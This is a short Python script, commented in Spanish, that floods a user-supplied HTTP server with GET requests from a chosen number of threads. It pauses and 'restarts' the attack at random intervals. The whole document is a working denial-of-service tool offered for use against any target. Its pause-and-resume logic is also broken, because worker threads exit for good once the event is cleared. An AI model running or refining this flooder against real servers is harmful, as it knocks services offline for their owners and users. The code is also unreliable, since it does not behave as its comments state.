import requests
import threading
import time
import random

def attack(url, run_event):
    while run_event.is_set():
        try:
            response = requests.get(f"http://{url}")
            print("Status Code: ", response.status_code)
        except Exception as e:
            print(e)

if __name__ == '__main__':
    target_url = input("Introduce la URL del servidor HTTP: ")
    num_threads = int(input("Introduce el número de hilos para realizar el ataque: "))

    run_event = threading.Event()
    run_event.set()

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack, args=(target_url, run_event))
        t.start()
        threads.append(t)

    try:
        while True:
            # Ejecuta durante un tiempo aleatorio entre 15 segundos y 1 minuto
            time.sleep(random.randint(15, 60))
            print("\nPausando el ataque...\n")
            run_event.clear()  # Indica a los hilos que se detengan

            # Espera 15 segundos antes de reiniciar
            time.sleep(15)
            print("\nReiniciando el ataque...\n")
            run_event.set()  # Indica a los hilos que continúen

    except KeyboardInterrupt:
        print("\nDeteniendo todos los hilos...")
        run_event.clear()

    for t in threads:
        t.join()
